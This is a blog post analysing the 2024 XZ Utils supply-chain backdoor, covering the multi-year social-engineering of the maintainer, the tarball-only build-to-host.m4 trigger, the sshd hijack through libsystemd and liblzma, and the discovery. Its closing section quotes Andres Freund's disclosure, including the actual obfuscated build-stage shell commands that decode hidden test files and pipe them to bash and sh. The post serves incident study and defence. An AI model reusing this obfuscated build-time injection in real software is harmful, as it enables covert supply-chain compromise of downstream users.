---
title: XZ Utils Backdoor
category: Security
environment: Supply Chain
excerpt: A Social-Engineered Supply-Chain Backdoor
tags:
  - Linux
  - Open Source
  - Supply Chain
  - Social Engineering
  - SSH
  - Nation State
image: "https://images.metmuseum.org/CRDImages/ep/web-large/DT50.jpg"
image_alt: "The Repast of the Lion - Henri Rousseau (le Douanier) French - ca. 1907"
date: 2026-03-07
---

One of my favourite quotes from *Darknet Diaries* is *"when truth is stranger than fiction."* It captures many of the incidents we encounter in cybersecurity. Some of them sound like something out of a thriller novel until you realize they actually happened.

That mixture is both fascinating and unsettling.

Advanced attacks where social engineering plays a central role in the attack path are especially interesting to me. They highlight something I consider a simple but uncomfortable truth: given the right circumstances, timing, and pressure, everyone can be manipulated by motivated and resourceful attacker. More vigilant one is, more resources needs to be tied in compromising the target.

The **XZ Utils backdoor incident in 2024** brought all of these elements together. It involved impressive technical creativity, a long and methodical social engineering campaign that unfolded over several years, and ultimately a fortunate discovery by a developer who noticed that SSH authentication suddenly took about **500 milliseconds longer than usual**.

> **Note:** I am not familiar with some of the most technical aspects of this incident, particularly around IFUNC symbol resolution and low-level dynamic linker mechanics. Some elements in this post are simplified. I have studied this incident properly only for few days now. For excellent deep-dives, I'd recommend [Veritasium's more approachable video on the incident](https://www.youtube.com/watch?v=aoag03mSuXQ&t=2909s) and/or [Denzel Farmer's more detailed technical lecture of the backdoor](https://www.youtube.com/watch?v=Q6ovtLdSbEA&t=3651s).

## Supply Chain Attack via Dependencies

Most people never think about `xz` or `liblzma` when talking about SSH. Atleast I never did.

It is simply a compression library (a very good one!), one of many small utilities buried deep inside the dependency trees of most Linux distributions.

However, in many systems `liblzma` is linked by `libsystemd`, and `libsystemd` is in turn used by OpenSSH's `sshd` in distributions that integrate SSH with systemd features such as socket activation or service notifications.

This creates an unexpected path.

SSH itself did not depend on XZ. Yet the runtime environment ended up loading code from that library.

The attack surface was therefore not SSH itself, but a compression library sitting several layers down the dependency chain that SSH never explicitly requested.

This illustrates one of the core problems in supply chain security. Modern software rarely depends only on what developers believe it depends on. It depends on what those dependencies depend on, and what *those* dependencies depend on, recursively.

Keeping a complete mental model of every transitive dependency, every maintainer, every build step, and every release artifact across that entire stack is not an easy task.

## Phase 1: The Long Con - Social Engineering Operation

What makes this incident remarkable is that it was not primarily a technical exploit.

It was patience.

A developer using the name **Jia Tan** (GitHub handle `JiaT75`) began contributing to the XZ Utils project around **2021**.

The initial contributions looked entirely normal. Bug fixes, documentation improvements, build system cleanup, and small technical improvements. The sort of contributions maintainers are usually happy to receive.

At the same time, several other accounts began appearing in mailing lists and issue discussions. These accounts complained about slow patch review times and suggested that the project needed additional maintainers to keep up with development.

Some of these accounts later appeared to have been created primarily to apply this pressure.

Over time this created a subtle dynamic. The original maintainer, **Lasse Collin**, had been maintaining the project largely alone for years. Like many open-source maintainers, he was dealing with a large workload and limited time.

Eventually the new contributor who had been consistently submitting useful patches appeared to be a natural choice to help.

By **2023**, Jia Tan had obtained commit access. By early **2024**, they were effectively acting as a co-maintainer.

From a community perspective, nothing looked suspicious. A contributor had spent years helping the project and gradually earned trust.

That is exactly how open source normally works.

Which is also why it worked so well.

## Phase 2: Laying the Groundwork

Once maintainer access was secured, the technical preparation began.

The changes were subtle and introduced gradually.

Two test files in the source tree carried the hidden payload material:

- `tests/files/bad-3-corrupt_lzma2.xz`
- `tests/files/good-large_compressed.lzma`

By themselves, those files were not enough to activate the backdoor.

The important trigger was a **modified `build-to-host.m4` file in the 5.6.0 and 5.6.1 release tarballs**. Andres Freund's disclosure notes that this file was present in the upstream release tarballs but **not** in the public Git repository.

That matters because it means someone inspecting only Git would miss a critical piece of the attack chain.

When the tarball was used to build the package, the modified build logic extracted a script that unpacked data from those test files and altered the `liblzma` build.

The trigger conditions were selective. According to Freund's analysis, the malicious path was aimed at builds on:

- **x86-64 Linux**
- **glibc-based systems**
- **GCC / GNU ld toolchains**
- **distribution-style package builds**, especially where Debian or RPM packaging indicators were present

Typical developer builds from Git were much less likely to trigger it.

That selectivity is one of the reasons the issue stayed hidden long enough to become dangerous.

Each individual change looked harmless. Test files appeared to be normal data. Build script modifications looked like routine maintenance.

Spread over months, nothing stood out enough to raise suspicion.

## Phase 3: The Backdoor

The malicious code is known to have been included in the **5.6.0 and 5.6.1 release tarballs** of XZ Utils.

During the affected build process, the injected script extracted and reconstructed malicious object code from the disguised test files and inserted it into the built `liblzma` library.

That alone was not enough to impact SSH everywhere.

OpenSSH does **not** normally load `liblzma` directly. The issue became relevant on systems where a common downstream patch caused `sshd` to use `libsystemd`, which in turn pulled in `liblzma`.

Under those circumstances, the modified `liblzma` could interfere with **OpenSSH authentication**.

At a simplified but confirmed level, the mechanism worked like this:

1. The malicious code first hijacked IFUNC-related resolver behavior inside `liblzma` during process startup.
2. It then used the dynamic linker's audit-related machinery to watch symbol binding in `sshd`.
3. When `RSA_public_decrypt()` was resolved, the backdoor redirected that call to attacker-controlled code.

Freund's analysis showed this redirection happening in the `sshd` authentication path. He was careful not to claim every detail of the final payload behavior was fully reverse engineered at the time, but he concluded it likely enabled unauthorized access or remote code execution in a pre-authentication context.

Conceptually, the idea is simpler than the implementation:

```text
Client connects to sshd
         |
         v
Patched sshd loads libsystemd
         |
         v
libsystemd loads liblzma
         |
         v
sshd reaches RSA verification
         |
         v
Backdoored liblzma redirects
RSA_public_decrypt()
         |
         v
Checks hand-crafted RSA certificate
with signed attacker input
         |
    +----+-----------------+
    |                      |
   Yes                     No
    |                      |
    v                      v
Potentially alter   Continue normal
auth behavior       SSH auth flow
```

In plain terms, the malicious `liblzma` code got a chance to interfere right where SSH was verifying authentication data.

If the incoming authentication data did not match what the backdoor expected, SSH continued normally, which helped the compromise stay hidden.

This conditional behavior is part of what made the backdoor so difficult to notice in regular use.

It also depended on a fairly specific chain of circumstances: the compromised release tarball, the right build environment, the resulting malicious `liblzma`, and an SSH build that loaded `libsystemd` and therefore `liblzma`.

That combination explains why the threat was severe while also not instantly obvious across every Linux system.

## Phase 4: Discovery - 500ms That Helped To Avoid.. Bad Things

In **March 2024**, **Andres Freund**, a PostgreSQL developer working at Microsoft, noticed something unusual.

SSH logins on his system were taking roughly **half a second longer** than expected.

That small delay might not have caught most people's attention.

Instead of ignoring it, he began investigating. Profiling `sshd` eventually led him to unexpected behavior originating from `liblzma`.

Following that trail ultimately revealed the entire backdoor.

Freund disclosed the findings on the **oss-security mailing list on March 29, 2024**, triggering a rapid response across the Linux ecosystem.

The vulnerability was assigned **CVE-2024-3094** with a **CVSS score of 10.0**.

At the time of discovery the compromised versions had already been incorporated into development branches of several distributions including **Debian Sid**, **Fedora Rawhide**, **Fedora 40 beta**, **openSUSE Tumbleweed**, and **Arch Linux**.

Fortunately they had not yet propagated widely into stable releases.

If discovery had occurred even a few weeks later, millions of systems could have been affected.

## Summary

This incident reveals several uncomfortable realities.

The **malicious maintainer problem** is extremely difficult to defend against. Jia Tan behaved exactly as a normal contributor should: providing useful patches, earning trust, and gradually gaining responsibility. Open source depends on trust relationships between maintainers and contributors. When that trust is exploited, the potential impact becomes enormous.

**Dependencies are deeply, recursively dangerous.** SSH did not depend on XZ directly. SSH depended on systemd notifications, which depended on `libsystemd`, which depended on `liblzma`, which is part of XZ. That dependency chain quietly carried malicious code into one of the most security-critical services on most Linux systems.

You could audit SSH and systemd extensively and still miss a threat living two layers deeper in the stack.

And, inevitably, systemd managed to appear in the middle of the story.

The discovery itself relied heavily on **individual curiosity and persistence**. There was no automated scanner that detected the backdoor. It was uncovered because one developer noticed a small performance anomaly and decided to investigate further.

That is not exactly a scalable security model. 

This case highlights something that often goes unnoticed: a large portion of our global digital infrastructure depends on the work of **open-source maintainers**, many of whom are volunteers maintaining complex projects in their spare time.

Lasse Collin maintained XZ Utils largely alone for years. That situation is not unusual in open source. Passion projects maintained by a handful of people quietly underpin enormous parts of the modern internet.

Organizations that build products and infrastructure on top of these projects benefit immensely from that work. Supporting maintainers, whether financially, through engineering resources, or through security review efforts, would help make the ecosystem more sustainable.

Because right now, the stability and security of critical infrastructure sometimes depends on whether a single overworked maintainer happens to have enough time that week. Even though that sentence is somewhat dramatized, the underlying idea still feels absurd to me.

## Closing note

The XZ incident is unlikely to be the first or the last critical supply chain compromise affecting open-source infrastructure.

Nation-state actors (attribution in this case remains inconclusive) have strong incentives to pursue attacks like this. Successfully inserting themselves into widely deployed infrastructure can provide what is effectively a “keys to the kingdom” type of access. Instead of targeting individual organizations, compromising a shared component in the software supply chain allows attackers to position themselves upstream of thousands of potential targets.

From a defensive perspective, incidents like this also highlight the value of security models such as Zero Trust. Even if the backdoor had reached stable releases, it would most likely have served only as an **initial foothold**. An attacker would still need to navigate internal monitoring, access controls, and segmentation within the target environment.

Still, the scale of what might have happened is difficult to ignore. Had the compromised versions propagated into stable distributions, this could have quietly turned into the early stage of a large-scale intelligence or espionage operation.

Thankfully, in this case, it didn’t.

## Source Context

To show how this incident was initially communicated and how the broader community started analyzing it, I'm including an excerpt of the raw source context below as a reference block. This is not meant to be read straight through like the rest of the post, but it helps show the research trail from the initial oss-security disclosure into later technical writeups.

````text
[Openwall](https://www.openwall.com/) 
[Products](https://www.openwall.com/)
[Services](https://www.openwall.com/services/)
Publications
Resources
[What's new](https://www.openwall.com/news)

[Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net/)[[<prev]](https://www.openwall.com/lists/oss-security/2024/03/29/3) [[next>]](https://www.openwall.com/lists/oss-security/2024/03/29/5) [[thread-next>]](https://www.openwall.com/lists/oss-security/2024/03/29/5) [[day]](https://www.openwall.com/lists/oss-security/2024/03/29/) [[month]](https://www.openwall.com/lists/oss-security/2024/03/) [[year]](https://www.openwall.com/lists/oss-security/) [[list]](https://www.openwall.com/lists/oss-security/) Message-ID: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
Date: Fri, 29
Mar 2024 08:51:26 -0700
From: Andres Freund <andres@...razel.de>
To:
oss-security@...ts.openwall.com
Subject: backdoor in upstream xz/liblzma leading to ssh
server compromise

Hi,

After observing a few odd symptoms around liblzma (part of
the xz package) on
Debian sid installations over the last weeks (logins with ssh
taking a lot of
CPU, valgrind errors) I figured out the answer:

The upstream xz
repository and the xz tarballs have been backdoored.

At first I thought this
was a compromise of debian's package, but it turns out
to be upstream.


==
Compromised Release Tarball ==

One portion of the backdoor is *solely in the
distributed tarballs*. For
easier reference, here's a link to debian's import of the
tarball, but it is
also present in the tarballs for 5.6.0 and 5.6.1:

[https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63](https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63)

That line is *not* in the upstream source of build-to-host, nor
is
build-to-host used by xz in git.  However, it is present in the tarballs
released upstream,
except for the "source code" links, which I think github
generates directly
from the repository contents:

[https://github.com/tukaani-project/xz/releases/tag/v5.6.0](https://github.com/tukaani-project/xz/releases/tag/v5.6.0)
[https://github.com/tukaani-project/xz/releases/tag/v5.6.1](https://github.com/tukaani-project/xz/releases/tag/v5.6.1)


This injects an obfuscated script to be executed at the end of configure.
This
script is fairly obfuscated and data from "test" .xz files in the
repository.


This script is executed and, if some preconditions match,
modifies
$builddir/src/liblzma/Makefile to contain

am__test =
bad-3-corrupt_lzma2.xz
...
am__test_dir=$(top_srcdir)/tests/files/$(am__test)
...
sed rpath $(am__test_dir) |
$(am__dist_setup) >/dev/null 2>&1


which ends up as
...; sed rpath
../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null
2>&1; ...

Leaving out the "| bash" that produces

####Hello####
#��Z�.hj�
eval
`grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep
^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024
>/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head
-c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c
+2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
>/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c
+1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) &&
head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
>/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 &&
(head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head
-c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc
$srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr
"\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1
-dc|/bin/sh
####World####

After de-obfuscation this leads to the attached injected.txt.


==
Compromised Repository ==

The files containing the bulk of the exploit are in an
obfuscated form in
  tests/files/bad-3-corrupt_lzma2.xz
 
tests/files/good-large_compressed.lzma
committed upstream. They were initially added in
[https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0](https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0)

Note that the files were not even used for any "tests" in
5.6.0.


Subsequently the injected code (more about that below) caused valgrind errors
and crashes
in some configurations, due the stack layout differing from what
the backdoor was
expecting.  These issues were attempted to be worked around
in 5.6.1:

[https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad](https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad)
[https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f](https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f)
[https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92](https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92)

For which the exploit code was then adjusted:
[https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89](https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89)

Given the activity over several weeks, the committer is either
directly
involved or there was some quite severe compromise of their
system. Unfortunately the
latter looks like the less likely explanation, given
they communicated on
various lists about the "fixes" mentioned above.


Florian Weimer first extracted the
injected code in isolation, also attached,
liblzma_la-crc64-fast.o, I had only
looked at the whole binary. Thanks!


== Affected Systems ==

The attached
de-obfuscated script is invoked first after configure, where it
decides whether to
modify the build process to inject the code.

These conditions include targeting
only x86-64 linux:
        if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1)
&& (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then

Building with
gcc and the gnu linker
        if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
   
exit 0
        fi
        if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
        exit 0
   
fi
        LDv=$LD" -v"
        if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then

   exit 0

Running as part of a debian or RPM package build:
        if test -f
"$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then

Particularly the
latter is likely aimed at making it harder to reproduce the
issue for
investigators.


Due to the working of the injected code (see below), it is likely the
backdoor
can only work on glibc based systems.


Luckily xz 5.6.0 and 5.6.1 have not
yet widely been integrated by linux
distributions, and where they have, mostly in
pre-release versions.


== Observing Impact on openssh server ==

With the
backdoored liblzma installed, logins via ssh become a lot slower.

time ssh
nonexistant@...alhost

before:
nonexistant@...alhost: Permission denied
(publickey).

before:
real	0m0.299s
user	0m0.202s
sys	0m0.006s

after:
nonexistant@...alhost:
Permission denied (publickey).

real	0m0.807s
user	0m0.202s
sys	0m0.006s


openssh
does not directly use liblzma. However debian and several other
distributions
patch openssh to support systemd notification, and libsystemd
does depend on
lzma.


Initially starting sshd outside of systemd did not show the slowdown,
despite
the backdoor briefly getting invoked. This appears to be part of
some
countermeasures to make analysis harder.

Observed requirements for the exploit:
a) TERM
environment variable is not set
b) argv[0] needs to be /usr/sbin/sshd
c)
LD_DEBUG, LD_PROFILE are not set
d) LANG needs to be set
e) Some debugging
environments, like rr, appear to be detected. Plain gdb
   appears to be detected in some
situations, but not others

To reproduce outside of systemd, the server can be
started with a clear
environment, setting only the required variable:

env -i
LANG=en_US.UTF-8 /usr/sbin/sshd -D


In fact, openssh does not need to be started as
a server to observe the
slowdown:

slow:
env -i LANG=C /usr/sbin/sshd -h

(about
0.5s on my older system)


fast:
env -i LANG=C TERM=foo /usr/sbin/sshd -h
env
-i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
...

(about 0.01s on the same
system)


It's possible that argv[0] other /usr/sbin/sshd also would have effect -
there
are obviously lots of servers linking to libsystemd.
````

I'll cut the disclosure here but:

You can view the full oss-security disclosure here: [Openwall oss-security post](https://www.openwall.com/lists/oss-security/2024/03/29/4)

You can view the broader community FAQ here: [Sam James' xz backdoor FAQ](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27)

You can view the bash-stage reverse engineering here: [Gynvael Coldwind's analysis](https://gynvael.coldwind.pl/?lang=en&id=782)